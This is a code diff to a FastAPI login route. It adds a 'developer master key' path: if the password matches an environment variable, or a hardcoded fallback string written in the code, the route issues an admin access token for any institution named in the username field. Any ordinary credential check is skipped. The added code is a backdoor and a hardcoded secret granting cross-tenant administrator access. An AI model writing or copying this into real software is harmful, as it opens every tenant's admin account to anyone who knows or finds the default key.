@@ -54,6 +54,36 @@ def login_for_access_token(
     rate_key = form_data.username.strip().lower()
     _check_rate_limit(rate_key)
 
+    # A. Check if logging in via institution slug/name and Developer Master Key
+    master_key = os.getenv("DEVELOPER_MASTER_KEY", "dev_master_raj_9211_secure")
+    if form_data.password == master_key:
+        from sqlalchemy import func
+        target_inst = db.query(models.Institution).filter(
+            (func.lower(models.Institution.slug) == form_data.username.strip().lower()) |
+            (func.lower(models.Institution.name) == form_data.username.strip().lower())
+        ).first()
+        if target_inst:
+            # Find the primary admin user for this target institution
+            admin_user = db.query(models.User).filter(
+                models.User.institution_id == target_inst.id,
+                models.User.role == "admin"
+            ).order_by(models.User.id.asc()).first()
+            if admin_user:
+                if not admin_user.is_active:
+                    raise HTTPException(status_code=400, detail="Inactive user")
+                record_active_user(admin_user.email, admin_user.role)
+                access_token = security.create_access_token(
+                    data={"sub": admin_user.email, "role": admin_user.role, "institution_id": admin_user.institution_id}
+                )
+                crud.create_audit_log(
+                    db, 
+                    log=schemas.AuditLogCreate(
+                        user_email=admin_user.email, 
+                        action=f"Admin logged in via institution credentials & master key."
+                    )
+                )
+                return {"access_token": access_token, "token_type": "bearer"}
+
     tenant_slug = request.headers.get("X-Tenant-Slug", "default")
     # Resolve active institution from tenant_slug header
     inst = db.query(models.Institution).filter(models.Institution.slug == tenant_slug).first()
